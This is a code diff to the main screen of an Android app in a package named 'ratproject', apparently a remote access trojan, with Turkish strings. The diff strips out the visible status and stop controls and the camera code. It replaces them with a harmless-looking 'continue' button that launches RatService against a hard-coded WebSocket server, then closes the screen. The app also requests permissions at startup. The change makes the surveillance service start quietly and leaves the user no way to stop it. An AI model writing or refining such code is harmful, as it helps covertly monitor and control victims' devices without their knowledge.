@@ -3,33 +3,20 @@ package com.example.ratproject;
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
 import android.os.Build;
 import android.os.Bundle;
-import android.provider.MediaStore;
-import android.util.Base64;
-import android.util.Log;
 import android.widget.Button;
-import android.widget.TextView;
 import android.widget.Toast;
-import java.io.ByteArrayOutputStream;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
 import com.example.ratproject.services.RatService;
 
 public class MainActivity extends AppCompatActivity {
-    private TextView statusText;
-    private Button connectButton;
-    private Button startServiceButton;
-    private Button cameraButton;
+    private Button continueButton;
 
     private static final int PERMISSION_REQUEST = 100;
-    private static final int CAMERA_REQUEST = 200;
-    private static final String TAG = "MainActivity";
-
     private static final String SERVER_URL = "ws://192.168.1.5:8080";
 
 
@@ -38,32 +25,14 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        statusText = findViewById(R.id.statusText);
-        connectButton = findViewById(R.id.connectButton);
-        startServiceButton = findViewById(R.id.startServiceButton);
-        cameraButton = findViewById(R.id.cameraButton);
+        continueButton = findViewById(R.id.continue_button);
 
-        connectButton.setOnClickListener(v -> {
+        continueButton.setOnClickListener(v -> {
             Intent intent = new Intent(this, RatService.class);
             intent.putExtra("server_url", SERVER_URL);
             startService(intent);
-            statusText.setText("Service Started");
-        });
-
-        startServiceButton.setOnClickListener(v -> {
-            Intent intent = new Intent(this, RatService.class);
-            stopService(intent);
-            statusText.setText("Service Stopped");
-        });
-
-        cameraButton.setOnClickListener(v -> {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
-                == PackageManager.PERMISSION_GRANTED) {
-                openCamera();
-            } else {
-                Toast.makeText(this, "Kamera izni gerekli", Toast.LENGTH_SHORT).show();
-                requestPermissions();
-            }
+            Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();
+            finish(); // Optional: close the activity after starting the service
         });
 
         requestPermissions();
@@ -119,45 +88,5 @@ public class MainActivity extends AppCompatActivity {
                 Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show();
             }
         }
-    }
-
-    private void openCamera() {
-        Intent cameraIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-        if (cameraIntent.resolveActivity(getPackageManager()) != null) {
-            startActivityForResult(cameraIntent, CAMERA_REQUEST);
-        } else {
-            Toast.makeText(this, "Kamera uygulaması bulunamadı", Toast.LENGTH_SHORT).show();
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        
-        if (requestCode == CAMERA_REQUEST && resultCode == RESULT_OK) {
-            if (data != null && data.getExtras() != null) {
-                Bitmap photo = (Bitmap) data.getExtras().get("data");
-                if (photo != null) {
-                    // Convert to base64 and send to server
-                    String base64Image = bitmapToBase64(photo);
-                    sendPhotoToServer(base64Image);
-                    statusText.setText("Fotoğraf çekildi ve gönderildi!");
-                }
-            }
-        }
-    }
-
-    private String bitmapToBase64(Bitmap bitmap) {
-        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream);
-        byte[] imageBytes = outputStream.toByteArray();
-        return Base64.encodeToString(imageBytes, Base64.DEFAULT);
-    }
-
-    private void sendPhotoToServer(String base64Image) {
-        // Bu fonksiyonu RatService ile iletişim kuracak şekilde geliştirebiliriz
-        // Şimdilik log'a yazdırıyoruz
-        Log.i(TAG, "Photo captured and converted to base64, length: " + base64Image.length());
-        Toast.makeText(this, "Fotoğraf base64 formatında hazır!", Toast.LENGTH_SHORT).show();
     }
 }
